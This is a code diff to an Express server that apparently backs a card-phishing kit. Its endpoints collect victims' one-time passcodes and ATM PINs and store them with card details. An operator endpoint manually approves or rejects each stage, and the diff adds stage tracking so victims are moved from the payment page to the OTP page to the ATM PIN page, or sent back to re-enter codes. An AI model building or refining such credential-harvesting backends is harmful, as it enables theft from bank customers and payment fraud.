@@ -69,6 +69,16 @@ function updateApplicationStatus(id, status, extra = {}) {
   return list[idx];
 }
 
+function getStageFromItem(item) {
+  if (!item) return 'payment';
+  if (item.stage) return item.stage;
+  if (item.status === 'success') return 'success';
+  if (item.status === 'accept') return 'otp';
+  if (item.status === 'otp_pending') return 'otp';
+  if (item.status === 'atm_pending') return 'atm';
+  return 'payment';
+}
+
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
@@ -180,36 +190,64 @@ app.get('/api/status/:id', (req, res) => {
   }
 
   const status = item.status || 'pending';
+  const stage = getStageFromItem(item);
+  const otpSubmitted = Boolean(item.otp);
+  const atmSubmitted = Boolean(item.atmPin);
   let redirectUrl = 'payment.html';
   let redirect = null;
-  let decision = null;
-  let stage = 'payment';
+  let decision = 'pending';
+  let payloadStage = stage;
 
-  if (status === 'accept') {
+  if (status === 'accept' && stage === 'otp' && otpSubmitted) {
+    redirectUrl = 'atm.html';
+    redirect = 'atm.html';
+    decision = 'approved';
+    payloadStage = 'atm';
+  } else if (status === 'accept' && stage === 'otp') {
     redirectUrl = 'otp.html';
     redirect = 'otp.html';
+    decision = 'pending';
+    payloadStage = 'otp';
+  } else if (status === 'accept' && stage === 'atm' && atmSubmitted) {
+    redirectUrl = 'success.html';
+    redirect = 'success.html';
     decision = 'approved';
-    stage = 'otp';
-  } else if (status === 'otp_verified') {
+    payloadStage = 'success';
+  } else if (status === 'accept' && stage === 'atm') {
     redirectUrl = 'atm.html';
     redirect = 'atm.html';
-    decision = 'approved';
-    stage = 'atm';
-  } else if (status === 'atm' || status === 'atm_verified') {
-    redirectUrl = 'atm.html';
-    redirect = 'atm.html';
-    decision = 'approved';
-    stage = 'atm';
+    decision = 'pending';
+    payloadStage = 'atm';
   } else if (status === 'success') {
     redirectUrl = 'success.html';
     redirect = 'success.html';
     decision = 'approved';
-    stage = 'success';
-  } else if (status === 'reject') {
+    payloadStage = 'success';
+  } else if (status === 'reject' && stage === 'otp') {
     redirectUrl = 'otp.html?error=1';
     redirect = 'otp.html?error=1';
     decision = 'rejected';
-    stage = 'otp';
+    payloadStage = 'otp';
+  } else if (status === 'reject' && stage === 'atm') {
+    redirectUrl = 'atm.html?error=1';
+    redirect = 'atm.html?error=1';
+    decision = 'rejected';
+    payloadStage = 'atm';
+  } else if (status === 'otp_pending') {
+    redirectUrl = 'otp.html';
+    redirect = 'otp.html';
+    decision = 'pending';
+    payloadStage = 'otp';
+  } else if (status === 'atm_pending') {
+    redirectUrl = 'atm.html';
+    redirect = 'atm.html';
+    decision = 'pending';
+    payloadStage = 'atm';
+  } else if (status === 'accept' && stage === 'payment') {
+    redirectUrl = 'otp.html';
+    redirect = 'otp.html';
+    decision = 'approved';
+    payloadStage = 'otp';
   }
 
   const payload = {
@@ -218,7 +256,9 @@ app.get('/api/status/:id', (req, res) => {
     redirectUrl,
     redirect,
     decision,
-    stage
+    stage: payloadStage,
+    otpSubmitted,
+    atmSubmitted
   };
 
   res.json(payload);
@@ -237,7 +277,8 @@ app.post('/api/otp', (req, res) => {
     return res.status(400).json({ ok: false, error: 'invalid_otp' });
   }
 
-  item.status = 'otp_verified';
+  item.status = 'otp_pending';
+  item.stage = 'otp';
   item.otp = otp.trim();
   item.card = {
     ...(item.card || {}),
@@ -250,7 +291,7 @@ app.post('/api/otp', (req, res) => {
   item.updatedAt = new Date().toISOString();
   writeApplications(list);
 
-  res.json({ ok: true, redirect: 'atm.html' });
+  res.json({ ok: true, status: 'otp_pending', stage: 'otp' });
 });
 
 app.post('/api/atm', (req, res) => {
@@ -267,7 +308,8 @@ app.post('/api/atm', (req, res) => {
   }
 
   const pin = atmPin.trim();
-  item.status = 'success';
+  item.status = 'atm_pending';
+  item.stage = 'atm';
   item.atmPin = pin;
   item.card = {
     ...(item.card || {}),
@@ -280,7 +322,7 @@ app.post('/api/atm', (req, res) => {
   item.updatedAt = new Date().toISOString();
   writeApplications(list);
 
-  res.json({ ok: true, redirect: 'success.html' });
+  res.json({ ok: true, status: 'atm_pending', stage: 'atm' });
 });
 
 app.post('/api/applications/:id/decision', (req, res) => {
@@ -291,12 +333,55 @@ app.post('/api/applications/:id/decision', (req, res) => {
     return res.status(400).json({ ok: false, error: 'invalid_decision' });
   }
 
-  const updated = updateApplicationStatus(id, decision, { decisionText: decision === 'accept' ? 'مقبول' : 'مرفوض' });
+  const list = readApplications();
+  const item = list.find((entry) => entry.id === id);
+  if (!item) {
+    return res.status(404).json({ ok: false, error: 'not_found' });
+  }
+
+  const currentStage = getStageFromItem(item);
+  let nextStage = currentStage;
+  let nextStatus = decision;
+
+  if (decision === 'accept') {
+    if (currentStage === 'payment') {
+      nextStage = 'otp';
+      nextStatus = 'accept';
+    } else if (currentStage === 'otp') {
+      nextStage = 'atm';
+      nextStatus = 'accept';
+    } else if (currentStage === 'atm') {
+      nextStage = 'success';
+      nextStatus = 'success';
+    } else {
+      nextStage = 'otp';
+      nextStatus = 'accept';
+    }
+  } else {
+    if (currentStage === 'payment') {
+      nextStage = 'payment';
+      nextStatus = 'reject';
+    } else if (currentStage === 'otp') {
+      nextStage = 'otp';
+      nextStatus = 'reject';
+    } else if (currentStage === 'atm') {
+      nextStage = 'atm';
+      nextStatus = 'reject';
+    } else {
+      nextStage = 'payment';
+      nextStatus = 'reject';
+    }
+  }
+
+  const updated = updateApplicationStatus(id, nextStatus, {
+    stage: nextStage,
+    decisionText: decision === 'accept' ? 'مقبول' : 'مرفوض'
+  });
   if (!updated) {
     return res.status(404).json({ ok: false, error: 'not_found' });
   }
 
-  res.json({ ok: true, id, status: decision });
+  res.json({ ok: true, id, status: nextStatus, stage: nextStage });
 });
 
 app.listen(PORT, () => {
